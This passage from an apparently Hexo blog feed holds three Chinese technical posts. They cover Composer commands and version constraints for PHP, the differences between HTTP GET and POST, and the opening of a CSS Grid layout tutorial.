<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"require"</span>: &#123;</span><br><span class="line">        <span class="attr">"monolog/monolog"</span>: <span class="string">"1.2.*"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上文件说明我们需要下载从 1.2 开始的任何版本的 monolog。</p>
<p>接下来只要运行以下命令即可安装依赖包： <a href="/articles/PHP发布自己的composer包/">如何发布包？</a></p>
<blockquote>
<p>composer install</p>
</blockquote>
<h4 id="require-命令"><a href="#require-命令" class="headerlink" title="require 命令"></a>require 命令</h4><p>除了使用 install 命令外，我们也可以使用 require 命令快速的安装一个依赖而不需要手动在 composer.json 里添加依赖信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> composer require monolog/monolog</span></span><br></pre></td></tr></table></figure>

<p>Composer 会先找到合适的版本，然后更新composer.json文件，在 require 那添加 monolog/monolog 包的相关信息，再把相关的依赖下载下来进行安装，最后更新 composer.lock 文件并生成 php 的自动加载文件。</p>
<h4 id="update-命令"><a href="#update-命令" class="headerlink" title="update 命令"></a>update 命令</h4><p>update 命令用于更新项目里所有的包，或者指定的某些包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 更新所有依赖</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> composer update</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 更新指定的包</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> composer update monolog/monolog</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 更新指定的多个包</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> composer update monolog/monolog symfony/dependency-injection</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 还可以通过通配符匹配包</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> composer update monolog/monolog symfony/*</span></span><br></pre></td></tr></table></figure>

<p>需要注意的时，包能升级的版本会受到版本约束的约束，包不会升级到超出约束的版本的范围。例如如果 composer.json 里包的版本约束为 ^1.10，而最新版本为 2.0。那么 update 命令是不能把包升级到 2.0 版本的，只能最高升级到 1.x 版本。关于<a href="#基本约束">版本约束</a>请看后面的介绍。</p>
<h4 id="remove-命令"><a href="#remove-命令" class="headerlink" title="remove 命令"></a>remove 命令</h4><p>remove 命令用于移除一个包及其依赖（在依赖没有被其他包使用的情况下），如果依赖被其他包使用，则无法移除：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> composer remove monolog/monolog</span></span><br><span class="line">Loading composer repositories with package information</span><br><span class="line">Updating dependencies (including require-dev)</span><br><span class="line">Package operations: 0 installs, 0 updates, 2 removals</span><br><span class="line">  - Removing psr/log (1.0.2)</span><br><span class="line">  - Removing monolog/monolog (1.23.0)</span><br><span class="line">Generating autoload files</span><br></pre></td></tr></table></figure>

<h4 id="search-命令"><a href="#search-命令" class="headerlink" title="search 命令"></a>search 命令</h4><p>search 命令可以搜索包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> composer search monolog</span></span><br></pre></td></tr></table></figure>

<p>该命令会输出包及其描述信息，如果只想输出包名可以使用 –only-name 参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> composer search --only-name monolog</span></span><br></pre></td></tr></table></figure>

<h4 id="show-命令"><a href="#show-命令" class="headerlink" title="show 命令"></a>show 命令</h4><p>show 命令可以列出当前项目使用到包的信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 列出所有已经安装的包</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> composer show</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 可以通过通配符进行筛选</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> composer show monolog/*</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示具体某个包的信息</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> composer show monolog/monolog</span></span><br></pre></td></tr></table></figure>

<h3 id="基本约束"><a href="#基本约束" class="headerlink" title="基本约束"></a>基本约束</h3><h4 id="精确版本"><a href="#精确版本" class="headerlink" title="精确版本"></a>精确版本</h4><p>我们可以告诉 Composer 安装的具体版本，例如：1.0.2，指定 1.0.2 版本。</p>
<h4 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h4><p>通过使用比较操作符来指定包的范围。这些操作符包括：<code>&gt;</code>，<code>&gt;=</code>，<code>&lt;</code>，<code>&lt;=</code>，<code>!=</code>。</p>
<p>你可以定义多个范围，使用空格或者逗号 , 表示逻辑上的与，使用双竖线 || 表示逻辑上的或。其中与的优先级会大于或。 实例：</p>
<ul>
<li>&gt;=1.0</li>
<li>&gt;=1.0 &lt;2.0</li>
<li>&gt;=1.0 &lt;1.1 || &gt;=1.2</li>
</ul>
<p>我们也可以通过使用连字符 - 来指定版本范围。</p>
<p>连字符的左边表明了 <code>&gt;=</code> 的版本，如果右边的版本不是完整的版本号，则会被使用通配符进行补全。例如 <code>1.0 - 2.0</code> 等同于 <code>&gt;=1.0.0</code> <code>&lt;2.1</code> （2.0相当于<code>2.0.*</code>），而<code>1.0.0 - 2.1.0</code>则等同于 <code>&gt;=1.0.0</code> <code>&lt;=2.1.0</code>。</p>
<h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><p>可以使用通配符来设置版本。<code>1.0.*</code> 相当于 <code>&gt;=1.0</code> <code>&lt;1.1</code>。</p>
<p>例子：1.0.*</p>
<h4 id="波浪号"><a href="#波浪号" class="headerlink" title="波浪号 ~"></a>波浪号 ~</h4><p>我们先通过后面这个例子去解释 <code>~</code> 操作符的用法：<code>~1.2</code> 相当于 <code>&gt;=1.2</code> <code>&lt;2.0.0</code>，而 <code>~1.2.3</code> 相当于 <code>&gt;=1.2.3</code> <code>&lt;1.3.0</code>。对于使用Semantic Versioning作为版本号标准的项目来说，这种版本约束方式很实用。例如 <code>~1.2</code> 定义了最小的小版本号，然后你可以升级2.0以下的任何版本而不会出问题，因为按照Semantic Versioning的版本定义，小版本的升级不应该有兼容性的问题。简单来说，<code>~</code> 定义了最小的版本，并且允许版本的最后一位版本号进行升级（没懂得话，请再看一边前面的例子）。</p>
<p>例子：~1.2</p>
<p>需要注意的是，如果 <code>~</code> 作用在主版本号上，例如 <code>~1</code>，按照上面的说法，Composer可以安装版本1以后的主版本，但是事实上是 <code>~1</code> 会被当作 <code>~1.0</code> 对待，只能增加小版本，不能增加主版本。</p>
<h4 id="折音号"><a href="#折音号" class="headerlink" title="折音号 ^"></a>折音号 ^</h4><p>^操作符的行为跟Semantic Versioning有比较大的关联，它允许升级版本到安全的版本。例如，^1.2.3相当于&gt;=1.2.3 &lt;2.0.0，因为在2.0版本前的版本应该都没有兼容性的问题。而对于1.0之前的版本，这种约束方式也考虑到了安全问题，例如^0.3会被当作&gt;=0.3.0 &lt;0.4.0对待。<br>例子：^1.2.3</p>
<h4 id="版本稳定性"><a href="#版本稳定性" class="headerlink" title="版本稳定性"></a>版本稳定性</h4><p>如果你没有显式的指定版本的稳定性，Composer会根据使用的操作符，默认在内部指定为-dev或者-stable。例如：</p>
<table>
<thead>
<tr>
<th align="left">约束</th>
<th align="left">内部约束</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1.2.3</td>
<td align="left">=1.2.3.0-stable</td>
</tr>
<tr>
<td align="left">&gt;1.2</td>
<td align="left">&gt;1.2.0.0-stable</td>
</tr>
<tr>
<td align="left">&gt;=1.2</td>
<td align="left">&gt;=1.2.0.0-dev</td>
</tr>
<tr>
<td align="left">&gt;=1.2-stable</td>
<td align="left">&gt;=1.2.0.0-stable</td>
</tr>
<tr>
<td align="left">&lt;1.3</td>
<td align="left">&lt;1.3.0.0-dev</td>
</tr>
<tr>
<td align="left">&lt;=1.3</td>
<td align="left">&lt;=1.3.0.0-stable</td>
</tr>
<tr>
<td align="left">1 - 2</td>
<td align="left">&gt;=1.0.0.0-dev &lt;3.0.0.0-dev</td>
</tr>
<tr>
<td align="left">~1.3</td>
<td align="left">&gt;=1.3.0.0-dev &lt;2.0.0.0-dev</td>
</tr>
<tr>
<td align="left">1.4.*</td>
<td align="left">&gt;=1.4.0.0-dev &lt;1.5.0.0-dev</td>
</tr>
</tbody></table>
<p>例子：1.0 - 2.0</p>
<p>如果你想指定版本只要稳定版本，你可以在版本后面添加后缀 <code>-stable</code>。<br>minimum-stability 配置项定义了包在选择版本时对稳定性的选择的默认行为。默认是<code>stable</code>。它的值如下（按照稳定性排序）：<code>dev</code>，<code>alpha</code>，<code>beta</code>，<code>RC</code>和<code>stable</code>。除了修改这个配置去修改这个默认行为，我们还可以通过稳定性标识（例如<code>@stable</code>和<code>@dev</code>）来安装一个相比于默认配置不同稳定性的版本。例如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"require"</span>: &#123;</span><br><span class="line">        <span class="attr">"monolog/monolog"</span>: <span class="string">"1.0.*@beta"</span>,</span><br><span class="line">        <span class="attr">"acme/foo"</span>: <span class="string">"@dev"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>GET和POST的区别</title>
    <url>/articles/GET%E5%92%8CPOST%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<p>GET 和 POST 是 HTTP 请求的两种基本方法，要说它们的区别，接触过 WEB 开发的人都能说出一二。<br>最直观的区别就是 GET 把参数包含在 URL 中，POST 通过 request body 传递参数。<br>你可能自己写过无数个 GET 和 POST 请求，或者已经看过很多权威网站总结出的他们的区别，你非常清楚知道什么时候该用什么。<br>当你在面试中被问到这个问题，你的内心充满了自信和喜悦。</p>
<p><img src="https://cdn.learnku.com/uploads/images/201903/21/28524/aME3sRsNPs.png!large" alt></p>
<p>你轻轻松松的给出了一个 “标准答案”：</p>
<ul>
<li>GET在浏览器回退时是无害的，而POST会再次提交请求。</li>
<li>GET产生的URL地址可以被Bookmark，而POST不可以。</li>
<li>GET请求会被浏览器主动cache，而POST不会，除非手动设置。</li>
<li>GET请求只能进行url编码，而POST支持多种编码方式。</li>
<li>GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。</li>
<li>GET请求在URL中传送的参数是有长度限制的，而POST么有。</li>
<li>对参数的数据类型，GET只接受ASCII字符，而POST没有限制。</li>
<li>GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。</li>
<li>GET参数通过URL传递，POST放在Request body中。</li>
</ul>
<p>“很遗憾，这不是我们要的回答！”</p>
<p>如果我告诉你 GET 和 POST 本质上没有区别你信吗？<br>让我们扒下 GET 和 POST 的外衣，坦诚相见吧！</p>
<p><img src="https://cdn.learnku.com/uploads/images/201903/21/28524/1mGrHgo38l.png!large" alt></p>
<p>GET 和 POST 是什么？HTTP 协议中的两种发送请求的方法。</p>
<p>HTTP 是什么？HTTP 是基于 TCP/IP 的关于数据如何在万维网中如何通信的协议。</p>
<p>HTTP 的底层是 TCP/IP。所以 GET 和 POST 的底层也是 TCP/IP，也就是说，GET/POST 都是 TCP 链接。GET 和 POST 能做的事情是一样一样的。你要给 GET 加上 request body，给 POST 带上 url 参数，技术上是完全行的通的。</p>
<p>“标准答案” 里的那些区别是怎么回事？</p>
<p><img src="https://cdn.learnku.com/uploads/images/201903/21/28524/dScx42N8xa.png!large" alt></p>
<p>在我大万维网世界中，TCP 就像汽车，我们用 TCP 来运输数据，它很可靠，从来不会发生丢件少件的现象。但是如果路上跑的全是看起来一模一样的汽车，那这个世界看起来是一团混乱，送急件的汽车可能被前面满载货物的汽车拦堵在路上，整个交通系统一定会瘫痪。为了避免这种情况发生，交通规则 HTTP 诞生了。HTTP 给汽车运输设定了好几个服务类别，有 GET, POST, PUT, DELETE 等等，HTTP 规定，当执行 GET 请求的时候，要给汽车贴上 GET 的标签（设置 method 为 GET），而且要求把传送的数据放在车顶上（url 中）以方便记录。如果是 POST 请求，就要在车上贴上 POST 的标签，并把货物放在车厢里。当然，你也可以在 GET 的时候往车厢内偷偷藏点货物，但是这是很不光彩；也可以在 POST 的时候在车顶上也放一些数据，让人觉得傻乎乎的。HTTP 只是个行为准则，而 TCP 才是 GET 和 POST 怎么实现的基本。</p>
<p>但是，我们只看到 HTTP 对 GET 和 POST 参数的传送渠道（url 还是 requrest body）提出了要求。“标准答案” 里关于参数大小的限制又是从哪来的呢？</p>
<p><img src="https://cdn.learnku.com/uploads/images/201903/21/28524/ji7JzxVZgt.png!large" alt></p>
<p>在我大万维网世界中，还有另一个重要的角色：运输公司。不同的浏览器（发起 http 请求）和服务器（接受 http 请求）就是不同的运输公司。 虽然理论上，你可以在车顶上无限的堆货物（url 中无限加参数）。但是运输公司可不傻，装货和卸货也是有很大成本的，他们会限制单次运输量来控制风险，数据量太大对浏览器和服务器都是很大负担。业界不成文的规定是，（大多数）浏览器通常都会限制 url 长度在 2K 个字节，而（大多数）服务器最多处理 64K 大小的 url。超过的部分，恕不处理。如果你用 GET 服务，在 request body 偷偷藏了数据，不同服务器的处理方式也是不同的，有些服务器会帮你卸货，读出数据，有些服务器直接忽略，所以，虽然 GET 可以带 request body，也不能保证一定能被接收到哦。</p>
<p>好了，现在你知道，GET 和 POST 本质上就是 TCP 链接，并无差别。但是由于 HTTP 的规定和浏览器 / 服务器的限制，导致他们在应用过程中体现出一些不同。</p>
<p>你以为本文就这么结束了？</p>
<p><img src="https://cdn.learnku.com/uploads/images/201903/21/28524/Kb6RMB5DXU.png!large" alt></p>
<p>我们的大 BOSS 还等着出场呢。。。</p>
<p>这位 BOSS 有多神秘？当你试图在网上找 “GET 和 POST 的区别” 的时候，那些你会看到的搜索结果里，从没有提到他。他究竟是什么呢。。。</p>
<p>GET 和 POST 还有一个重大区别，简单的说：</p>
<p>GET产生一个TCP数据包；POST产生两个TCP数据包。<br>长的说：</p>
<blockquote>
<p>对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；</p>
<p>而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。</p>
<p>也就是说，GET只需要汽车跑一趟就把货送到了，而POST得跑两趟，第一趟，先去和服务器打个招呼“嗨，我等下要送一批货来，你们打开门迎接我”，然后再回头把货送过去。</p>
<p>因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑！跳入需谨慎。为什么？</p>
<ol>
<li><p>GET与POST都有自己的语义，不能随便混用。</p>
</li>
<li><p>据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。</p>
</li>
<li><p>并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。</p>
</li>
</ol>
</blockquote>
<p>现在，当面试官再问你 “GET 与 POST 的区别” 的时候，你的内心是不是这样的？</p>
<p><img src="https://cdn.learnku.com/uploads/images/201903/21/28524/MDjzqK9B9Q.png!large" alt></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>Grid布局</title>
    <url>/articles/Grid%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><p>网格布局（Grid）是最强大的 CSS 布局方案。</p>
<p>它将网页划分成一个个网格，可以任意组合不同的网格，做出各种各样的布局。以前，只能通过复杂的 CSS 框架达到的效果，现在浏览器内置了。</p>
<p><img src="/articles/Grid布局/1_bg2019032501.png" alt></p>
<p>上图这样的布局，就是 Grid 布局的拿手好戏。</p>
<p>Grid 布局与 <a href="/articles/Flex布局">Flex 布局</a>有一定的相似性，都可以指定容器内部多个项目的位置。但是，它们也存在重大区别。</p>
<p>Flex 布局是轴线布局，只能指定”项目”针对轴线的位置，可以看作是<strong>一维布局</strong>。Grid 布局则是将容器划分成”行”和”列”，产生单元格，然后指定”项目所在”的单元格，可以看作是<strong>二维布局</strong>。Grid 布局远比 Flex 布局强大。</p>
<h3 id="二、基本概念"><a href="#二、基本概念" class="headerlink" title="二、基本概念"></a>二、基本概念</h3><p>学习 Grid 布局之前，需要了解一些基本概念。</p>
<h4 id="2-1-容器和项目"><a href="#2-1-容器和项目" class="headerlink" title="2.1 容器和项目"></a>2.1 容器和项目</h4><p>采用网格布局的区域，称为”容器”（container）。容器内部采用网格定位的子元素，称为”项目”（item）。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>2<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>3<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，最外层的<code>&lt;div&gt;</code>元素就是容器，内层的三个<code>&lt;div&gt;</code>元素就是项目。</p>
<p>注意：项目只能是容器的顶层子元素，不包含项目的子元素，比如上面代码的<code>&lt;p&gt;</code>元素就不是项目。Grid 布局只对项目生效。</p>
<h4 id="2-2-行和列"><a href="#2-2-行和列" class="headerlink" title="2.2 行和列"></a>2.2 行和列</h4><p>容器里面的水平区域称为”行”（row），垂直区域称为”列”（column）。</p>
<p><img src="/articles/Grid布局/1_bg2019032502.png" alt></p>
<p>上图中，水平的深色区域就是”行”，垂直的深色区域就是”列”。</p>
<h4 id="2-3-单元格"><a href="#2-3-单元格" class="headerlink" title="2.3 单元格"></a>2.3 单元格</h4><p>行和列的交叉区域，称为”单元格”（cell）。</p>
<p>正常情况下，<code>n</code>行和<code>m</code>列会产生<code>n x m</code>个单元格。比如，3行3列会产生9个单元格。</p>
<h4 id="2-4-网格线"><a href="#2-4-网格线" class="headerlink" title="2.4 网格线"></a>2.4 网格线</h4><p>划分网格的线，称为”网格线”（grid line）。水平网格线划分出行，垂直网格线划分出列。</p>
<p>正常情况下，<code>n</code>行有<code>n + 1</code>根水平网格线，<code>m</code>列有<code>m + 1</code>根垂直网格线，比如三行就有四根水平网格线。</p>
<p><img src="/articles/Grid布局/1_bg2019032503.png" alt></p>
<p>上图是一个 4 x 4 的网格，共有5根水平网格线和5根垂直网格线。</p>
<h3 id="三、容器属性"><a href="#三、容器属性" class="headerlink" title="三、容器属性"></a>三、容器属性</h3><p>Grid 布局的属性分成两类。一类定义在容器上面，称为容器属性；另一类定义在项目上面，称为项目属性。这部分先介绍容器属性。</p>
<h4 id="3-1-display-属性"><a href="#3-1-display-属性" class="headerlink" title="3.1 display 属性"></a>3.1 display 属性</h4><p><code>display: grid</code>指定一个容器采用网格布局。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">   <span class="attribute">display</span>: grid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/Grid布局/bg2019032504.png" alt></p>
<p>上图是<code>display: grid</code>的<a href="https://jsbin.com/guvivum/edit?html,css,output" target="_blank" rel="noopener">效果</a>。</p>
<p>默认情况下，容器元素都是块级元素，但也可以设成行内元素。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-grid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码指定<code>div</code>是一个行内元素，该元素内部采用网格布局。</p>
<p><img src="/articles/Grid布局/bg2019032505.png" alt></p>
<p>上图是<code>display: inline-grid</code>的<a href="https://jsbin.com/qatitav/edit?html,css,output" target="_blank" rel="noopener">效果</a>。</p>
<blockquote>
<p>注意，设为网格布局以后，容器子元素（项目）的<code>float</code>、<code>display: inline-block</code>、<code>display: table-cell</code>、<code>vertical-align</code>和<code>column-*</code>等设置都将失效。</p>
</blockquote>
<h4 id="3-2-grid-template-columns，grid-template-rows-属性"><a href="#3-2-grid-template-columns，grid-template-rows-属性" class="headerlink" title="3.2  grid-template-columns，grid-template-rows 属性"></a>3.2  grid-template-columns，grid-template-rows 属性</h4><p>容器指定了网格布局以后，接着就要划分行和列。<code>grid-template-columns</code>属性定义每一列的列宽，<code>grid-template-rows</code>属性定义每一行的行高。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: <span class="number">100px</span> <span class="number">100px</span> <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">grid-template-rows</span>: <span class="number">100px</span> <span class="number">100px</span> <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/qiginur/edit?css,output" target="_blank" rel="noopener">上面代码</a>指定了一个三行三列的网格，列宽和行高都是<code>100px</code>。</p>
<p><img src="/articles/Grid布局/bg2019032506.png" alt></p>
<p>除了使用绝对单位，也可以使用百分比。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: <span class="number">33.33%</span> <span class="number">33.33%</span> <span class="number">33.33%</span>;</span><br><span class="line">    <span class="attribute">grid-template-rows</span>: <span class="number">33.33%</span> <span class="number">33.33%</span> <span class="number">33.33%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>（1）repeat()</strong></p>
<p>有时候，重复写同样的值非常麻烦，尤其网格很多时。这时，可以使用<code>repeat()</code>函数，简化重复的值。上面的代码用<code>repeat()</code>改写如下。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(3, 33.33%);</span><br><span class="line">    <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(3, 33.33%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>repeat()</code>接受两个参数，第一个参数是重复的次数（上例是3），第二个参数是所要重复的值。</p>
<p><code>repeat()</code>重复某种模式也是可以的。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">grid-template-columns</span>: <span class="selector-tag">repeat</span>(2, 100<span class="selector-tag">px</span> 20<span class="selector-tag">px</span> 80<span class="selector-tag">px</span>);</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/cokohu/edit?css,output" target="_blank" rel="noopener">上面代码</a>定义了6列，第一列和第四列的宽度为<code>100px</code>，第二列和第五列为<code>20px</code>，第三列和第六列为<code>80px</code>。</p>
<p><img src="/articles/Grid布局/bg2019032507.png" alt></p>
<p><strong>（2）auto-fill 关键字</strong></p>
<p>有时，单元格的大小是固定的，但是容器的大小不确定。如果希望每一行（或每一列）容纳尽可能多的单元格，这时可以使用<code>auto-fill</code>关键字表示自动填充。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(auto-fill, 100px);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/himoku/edit?css,output" target="_blank" rel="noopener">上面代码</a>表示每列宽度<code>100px</code>，然后自动填充，直到容器不能放置更多的列。</p>
<p><img src="/articles/Grid布局/bg2019032508.png" alt></p>
<p><strong>（3）fr 关键字</strong></p>
<p>为了方便表示比例关系，网格布局提供了<code>fr</code>关键字（fraction 的缩写，意为”片段”）。如果两列的宽度分别为<code>1fr</code>和<code>2fr</code>，就表示后者是前者的两倍。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: <span class="number">1</span>fr <span class="number">1</span>fr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/hadexek/edit?html,css,output" target="_blank" rel="noopener">上面代码</a>表示两个相同宽度的列。</p>
<p><img src="/articles/Grid布局/1_bg2019032509.png" alt></p>
<p><code>fr</code>可以与绝对长度的单位结合使用，这时会非常方便。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: <span class="number">150px</span> <span class="number">1</span>fr <span class="number">2</span>fr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/remowec/edit?html,css,output" target="_blank" rel="noopener">上面代码</a>表示，第一列的宽度为150像素，第二列的宽度是第三列的一半。</p>
<p><img src="/articles/Grid布局/bg2019032510.png" alt></p>
<p><strong>（4）minmax()</strong></p>
<p><code>minmax()</code>函数产生一个长度范围，表示长度就在这个范围之中。它接受两个参数，分别为最小值和最大值。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">grid-template-columns</span>: 1<span class="selector-tag">fr</span> 1<span class="selector-tag">fr</span> <span class="selector-tag">minmax</span>(100<span class="selector-tag">px</span>, 1<span class="selector-tag">fr</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>minmax(100px, 1fr)</code>表示列宽不小于<code>100px</code>，不大于<code>1fr</code>。</p>
<p><strong>（5）auto 关键字</strong></p>
<p><code>auto</code>关键字表示由浏览器自己决定长度。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">grid-template-columns</span>: 100<span class="selector-tag">px</span> <span class="selector-tag">auto</span> 100<span class="selector-tag">px</span>;</span><br></pre></td></tr></table></figure>

<p>上面代码中，第二列的宽度，基本上等于该列单元格的最大宽度，除非单元格内容设置了<code>min-width</code>，且这个值大于最大宽度。</p>
<p><strong>（6）网格线的名称</strong></p>
<p><code>grid-template-columns</code>属性和<code>grid-template-rows</code>属性里面，还可以使用方括号，指定每一根网格线的名字，方便以后的引用。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: [c1] <span class="number">100px</span> [c2] <span class="number">100px</span> [c3] auto [c4];</span><br><span class="line">    <span class="attribute">grid-template-rows</span>: [r1] <span class="number">100px</span> [r2] <span class="number">100px</span> [r3] auto [r4];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码指定网格布局为3行 x 3列，因此有4根垂直网格线和4根水平网格线。方括号里面依次是这八根线的名字。</p>
<p>网格布局允许同一根线有多个名字，比如<code>[fifth-line row-5]</code>。</p>
<p><strong>（7）布局实例</strong></p>
<p><code>grid-template-columns</code>属性对于网页布局非常有用。两栏式布局只需要一行代码。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: <span class="number">70%</span> <span class="number">30%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码将左边栏设为70%，右边栏设为30%。</p>
<p>传统的十二网格布局，写起来也很容易。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">grid-template-columns</span>: <span class="selector-tag">repeat</span>(12, 1<span class="selector-tag">fr</span>);</span><br></pre></td></tr></table></figure>

<h4 id="3-3-grid-row-gap，grid-column-gap，grid-gap-属性"><a href="#3-3-grid-row-gap，grid-column-gap，grid-gap-属性" class="headerlink" title="3.3  grid-row-gap，grid-column-gap，grid-gap 属性"></a>3.3  grid-row-gap，grid-column-gap，grid-gap 属性</h4><p><code>grid-row-gap</code>属性设置行与行的间隔（行间距），<code>grid-column-gap</code>属性设置列与列的间隔（列间距）。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">grid-row-gap</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">grid-column-gap</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/mezufab/edit?css,output" target="_blank" rel="noopener">上面代码</a>中，<code>grid-row-gap</code>用于设置行间距，<code>grid-column-gap</code>用于设置列间距。</p>
<p><img src="/articles/Grid布局/bg2019032511.png" alt></p>
